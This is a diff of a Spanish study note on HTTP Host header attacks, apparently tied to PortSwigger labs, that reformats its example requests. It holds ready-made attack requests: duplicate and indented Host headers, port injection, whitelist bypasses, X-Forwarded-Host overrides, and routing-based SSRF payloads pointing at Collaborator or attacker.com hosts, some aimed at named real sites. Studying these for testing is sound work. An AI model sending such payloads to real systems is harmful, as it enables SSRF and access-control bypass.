@@ -36,7 +36,7 @@ tags:
 
 ## 🧪 Cómo cazarlo (metodología)
 
-1. **Cambiá el `Host` por basura** (`Host: bad-stuff-here`) y reenviá. ¿La app **sigue respondiendo normal** (200, misma página)? → no valida el Host = terreno fértil.
+1. **Cambiá el `Host` por basura** (`Host:` ==`bad-stuff-here`==) y reenviá. ¿La app **sigue respondiendo normal** (200, misma página)? → no valida el Host = terreno fértil.
 2. **Buscá dónde reaparece el valor:** en el **HTML** de la respuesta, en un `<link>/<script>` **absoluto**, en un `Location:` de redirect, o en un **email** (reset de contraseña). → *superficie reflejada*.
 3. **¿Cambia el comportamiento?** Probá `Host: localhost` → ¿se abre `/admin`? *(decisión de acceso)*. Probá tu **Collaborator** en el `Host` → ¿llega interacción? *(routing/SSRF ciego)*.
 4. **Si el `Host` está validado**, no te rindas: pasá a [Parte 1 — cómo colar tu valor](#parte-1--🔧-cómo-colar-tu-valor-manipular-el-host) (headers override + requests ambiguas + parseo defectuoso).
@@ -52,54 +52,47 @@ tags:
 
 ## Parte 1 — 🔧 Cómo colar tu valor (manipular el `Host`)
 
+> [!info] Leyenda
+> ==`bad-stuff-here`== = **el valor que vos controlás** (tu dominio, una IP interna, un payload). Es lo que querés que el server termine usando.
+
 ### A. Requests ambiguas
 Cuando el front-end y el back-end **parsean distinto**, colás un segundo valor que uno ignora y el otro usa.
 
 - **Headers `Host` duplicados** — la caché/validador mira uno, el back-end usa el otro:
-```
-GET /example HTTP/1.1
-Host: vulnerable-website.com
-Host: bad-stuff-here
-```
+> `GET /example HTTP/1.1`
+> `Host: vulnerable-website.com`
+> `Host:` ==`bad-stuff-here`==
+
 - **URL absoluta en la request line** — algunos servers rutean por la URL y validan el `Host` aparte:
-```
-GET https://vulnerable-website.com/ HTTP/1.1
-Host: bad-stuff-here
-```
+> `GET https://vulnerable-website.com/ HTTP/1.1`
+> `Host:` ==`bad-stuff-here`==
+
 - **Line wrapping (header indentado)** — el header con espacio al principio se "esconde" de un parser pero lo ve el otro:
-```
-GET /example HTTP/1.1
-    Host: bad-stuff-here
-Host: vulnerable-website.com
-```
+> `GET /example HTTP/1.1`
+> `    Host:` ==`bad-stuff-here`== _(← ojo la sangría al principio)_
+> `Host: vulnerable-website.com`
 
 ### B. Validación defectuosa
 Cuando **sí** hay validación pero es floja.
 
 - **Puerto como vía de inyección** — validan el hostname, no el puerto → metés el payload ahí (base del **dangling markup**):
-```
-GET /example HTTP/1.1
-Host: vulnerable-website.com:bad-stuff-here
-```
+> `GET /example HTTP/1.1`
+> `Host: vulnerable-website.com:`==`bad-stuff-here`==
+
 - **Dominio que termina igual que la whitelist** — si valida por "termina en / contiene":
-```
-GET /example HTTP/1.1
-Host: notvulnerable-website.com
-```
+> `GET /example HTTP/1.1`
+> `Host:` ==`notvulnerable-website.com`==
+
 - **Subdominio comprometido / arbitrario** — si valida por "es subdominio de":
-```
-GET /example HTTP/1.1
-Host: hacked-subdomain.vulnerable-website.com
-```
+> `GET /example HTTP/1.1`
+> `Host:` ==`hacked-subdomain`==`.vulnerable-website.com`
 
 ### C. Headers de override del Host
 Si el `Host` está blindado, muchas apps confían en un header alternativo (a veces **por encima** del `Host`):
 
-```
-GET /example HTTP/1.1
-Host: vulnerable-website.com
-X-Forwarded-Host: bad-stuff-here
-```
+> `GET /example HTTP/1.1`
+> `Host: vulnerable-website.com`
+> `X-Forwarded-Host:` ==`bad-stuff-here`==
 
 > Otros headers para probar cuando `X-Forwarded-Host` no anda:
 > `X-Host` · `X-Forwarded-Server` · `X-HTTP-Host-Override` · `Forwarded`
@@ -136,36 +129,36 @@ Host: <VAR>.victim.com     ← Intruder sobre <VAR>
 ```
 Referencia: [virtual host enumeration](https://www.freecodecamp.org/news/virtual-host-enumeration-tutorial/).
 
-**Routing-based SSRF.** Un front-end que **rutea por el Host** te deja mandar la petición a IPs internas → SSRF. Es **ciego**: confirmás con **Collaborator** y escaneás la `/24` con Intruder. Research de referencia: [Cracking the lens (PortSwigger)](https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface). Payloads del research (útiles como plantillas):
-```
-GET / HTTP/1.1
-Host: uniqid.burpcollaborator.net
-Connection: close
-```
-```
-GET @burp-collaborator.net/ HTTP/1.1
-Host: newrelic.com
-Connection: close
-```
-```
-GET xyz.burpcollaborator.net:80/bar HTTP/1.1
-Host: demo.globaleaks.org
-Connection: close
-```
-```
-GET / HTTP/1.1
-Host: store.starbucks.ca
-X-Forwarded-For: a.burpcollaborator.net
-True-Client-IP: b.burpcollaborator.net
-Referer: http://c.burpcollaborator.net/
-X-WAP-Profile: http://d.burpcollaborator.net/wap.xml
-Connection: close
-```
-```
-GET https://victim.com/ HTTP/1.1
-Host: attacker.com
-Connection: close
-```
+**Routing-based SSRF.** Un front-end que **rutea por el Host** te deja mandar la petición a IPs internas → SSRF. Es **ciego**: confirmás con **Collaborator** y escaneás la `/24` con Intruder. Research de referencia: [Cracking the lens (PortSwigger)](https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface). Payloads del research (==resaltado== = **lo que controlás vos**: tu subdominio de Collaborator o tu dominio):
+
+Host apuntando directo a tu Collaborator:
+> `GET / HTTP/1.1`
+> `Host:` ==`uniqid.burpcollaborator.net`==
+> `Connection: close`
+
+Collaborator en la request line (`@` / URL absoluta), Host legítimo:
+> `GET @`==`burp-collaborator.net`==`/ HTTP/1.1`
+> `Host: newrelic.com`
+> `Connection: close`
+
+> `GET` ==`xyz.burpcollaborator.net`==`:80/bar HTTP/1.1`
+> `Host: demo.globaleaks.org`
+> `Connection: close`
+
+Collaborator repartido en varios headers de routing (probás cuál "pega"):
+> `GET / HTTP/1.1`
+> `Host: store.starbucks.ca`
+> `X-Forwarded-For:` ==`a.burpcollaborator.net`==
+> `True-Client-IP:` ==`b.burpcollaborator.net`==
+> `Referer: http://`==`c.burpcollaborator.net`==`/`
+> `X-WAP-Profile: http://`==`d.burpcollaborator.net`==`/wap.xml`
+> `Connection: close`
+
+URL absoluta al target, Host que controlás (el server conecta al Host):
+> `GET https://victim.com/ HTTP/1.1`
+> `Host:` ==`attacker.com`==
+> `Connection: close`
+
 *(Labs 5 y 6; emparenta con [[vulnerabilities/007-ssrf/ssrf|SSRF]].)*
 
 **Connection state attacks.** El server valida el `Host` **solo en la primera request** de la conexión TCP y asume que las siguientes van al mismo host → **reusás la conexión** con un Host distinto (interno) en la 2ª request. Research: [browser-powered desync attacks (§ Connection state)](https://portswigger.net/research/browser-powered-desync-attacks#state). *(Lab 7 · Expert.)*
